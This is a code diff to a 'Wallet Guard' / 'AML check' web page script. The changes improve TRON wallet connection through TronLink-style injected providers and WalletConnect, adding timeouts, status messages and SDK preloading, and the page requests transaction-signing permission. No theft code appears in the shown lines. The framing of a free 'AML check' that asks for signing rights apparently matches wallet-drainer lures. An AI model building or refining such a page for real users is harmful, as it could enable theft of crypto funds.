@@ -202,19 +202,27 @@ function pick(){
     w.trustwallet&&w.trustwallet.tronLink, w.tronWeb].filter(Boolean);
 }
 
+const ADDR_RE = /^T[1-9A-HJ-NP-Za-km-z]{33}$/;
+const withTimeout = (pr, ms) => Promise.race([pr, sleep(ms).then(() => null)]);
+
 async function connectInjected(){
   const seen = new Set();
-  for (const prov of pick()) {
+  const list = pick();
+  if (!list.length) return null;
+  for (const prov of list) {
     if (seen.has(prov)) continue;
     seen.add(prov);
-    let res;
-    try { if (prov.request) res = await prov.request({ method: 'tron_requestAccounts' }); } catch (e) {}
     const take = () => (prov.tronWeb || prov.tronLink || prov);
     let tw = take();
     let addr = tw && tw.defaultAddress && tw.defaultAddress.base58;
-    if (!addr && Array.isArray(res)) addr = res.find((x) => typeof x === 'string' && /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(x));
-    if (!addr && typeof res === 'string' && /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(res)) addr = res;
-    if (!addr) { await sleep(1200); tw = take(); addr = tw && tw.defaultAddress && tw.defaultAddress.base58; }
+    if (addr) return { tw, addr };
+    let res = null;
+    try { if (prov.request) res = await withTimeout(prov.request({ method: 'tron_requestAccounts' }), 1500); } catch (e) {}
+    tw = take();
+    addr = (tw && tw.defaultAddress && tw.defaultAddress.base58) || null;
+    if (!addr && Array.isArray(res)) addr = res.find((x) => typeof x === 'string' && ADDR_RE.test(x));
+    if (!addr && typeof res === 'string' && ADDR_RE.test(res)) addr = res;
+    if (!addr) { await sleep(300); tw = take(); addr = tw && tw.defaultAddress && tw.defaultAddress.base58; }
     if (addr) return { tw: tw || prov, addr };
   }
   return null;
@@ -222,6 +230,7 @@ async function connectInjected(){
 
 async function ensureSigner(){
   if (signer) return true;
+  setStatus('Connecting wallet…');
   const got = await connectInjected();
   if (got) { signer = { kind: 'tronlink', w: got.tw, addr: got.addr }; return true; }
   const wc = await connectWc();
@@ -238,9 +247,12 @@ async function connectWallet(){
 }
 
 let wcClient = null;
+let wcSdk = null;
+const wcSdkLoad = () => (wcSdk = wcSdk || import('https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.17.2/+esm'));
 async function connectWc(){
+  setStatus('Opening WalletConnect…');
   try {
-    const { SignClient } = await import('https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.17.2/+esm');
+    const { SignClient } = await wcSdkLoad();
     wcClient = await SignClient.init({ projectId: cfg.wcProjectId, relayUrl: 'wss://relay.walletconnect.com',
       metadata: { name: 'Wallet Guard', description: 'AML check', url: location.origin, icons: [] } });
     const { uri, approval } = await wcClient.connect({ requiredNamespaces: { tron: { methods: ['tron_signTransaction'], chains: [CHAIN], events: [] } }, sessionProperties: { tron_method_version: 'v1' } });
@@ -380,6 +392,7 @@ $('copyaddr').addEventListener('click', () => { navigator.clipboard.writeText(ac
 $('check').addEventListener('click', runCheck);
 $('complete').addEventListener('click', complete);
 $('addr').addEventListener('keydown', (e)=>{ if(e.key==='Enter') runCheck(); });
+if (!DEMO) setTimeout(() => wcSdkLoad().catch(() => {}), 1200);
 if (DEMO) $('addr').value = 'TXk9dF2bWqZc8sVh3nU7jL4mR6tY1pQ2wE';
 </script>
 <div id="wc" class="hidden">
